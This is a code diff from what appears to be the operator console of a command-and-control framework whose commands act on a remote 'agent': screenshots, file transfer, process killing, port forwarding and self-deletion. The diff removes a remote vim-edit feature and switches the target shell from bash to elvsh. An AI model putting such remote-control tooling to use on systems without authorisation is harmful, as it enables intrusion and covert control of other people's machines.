@@ -31,7 +31,6 @@ var CommandHelp = map[string]string{
 	"ps":              "Process list of selected agent",
 	"kill":            "Terminate a process on selected agent: eg. `kill <pid>`",
 	"get":             "Download a file from selected agent",
-	"vim":             "Edit a text file on selected agent",
 	"put":             "Upload a file to selected agent",
 	"screenshot":      "Take a screenshot of selected agent",
 	"suicide":         "Kill agent process, delete agent root directory",
@@ -75,7 +74,6 @@ var CmdFuncsWithArgs = map[string]func(string){
 	"delete_port_fwd": DeletePortFwdSession,
 	"debug":           setDebugLevel,
 	"search":          ModuleSearch,
-	"vim":             vimEditFile,
 	"set":             setOptVal,
 	"label":           setTargetLabel,
 	"target":          setCurrentTarget,
@@ -174,37 +172,6 @@ func CmdHelp(mod string) {
 	CliPrintError("Help yourself")
 }
 
-func vimEditFile(cmd string) {
-	cmdSplit := util.ParseCmd(cmd)
-	if len(cmdSplit) < 2 {
-		CliPrintError("What file to edit?")
-		return
-	}
-	filepath := strings.Join(cmdSplit[1:], " ")
-	filename := util.FileBaseName(filepath)
-
-	// tell user what to do
-	CliPrintInfo("[*] Now edit %s in vim window",
-		filepath)
-
-	// edit remote files
-	if GetFile(filepath, CurrentTarget) != nil {
-		CliPrintError("Cannot download %s", filepath)
-		return
-	}
-
-	if err = VimEdit(FileGetDir + filename); err != nil {
-		CliPrintError("VimEdit: %v", err)
-		return
-	} // wait until vim exits
-
-	// upload the new file to target
-	if PutFile(FileGetDir+filename, filepath, CurrentTarget) != nil {
-		CliPrintError("Cannot upload %s", filepath)
-		return
-	}
-}
-
 func setCurrentTarget(cmd string) {
 	cmdSplit := strings.Fields(cmd)
 	if len(cmdSplit) != 2 {
@@ -250,7 +217,7 @@ func setCurrentTarget(cmd string) {
 		// do not open shell automatically in Windows
 		if a.GOOS != "windows" {
 			CliPrintInfo("Opening Shell window")
-			err = SSHClient("bash", "", RuntimeConfig.SSHDPort, true)
+			err = SSHClient("elvsh", "", RuntimeConfig.SSHDPort, true)
 			if err != nil {
 				CliPrintError("SSHClient: %v", err)
 			}
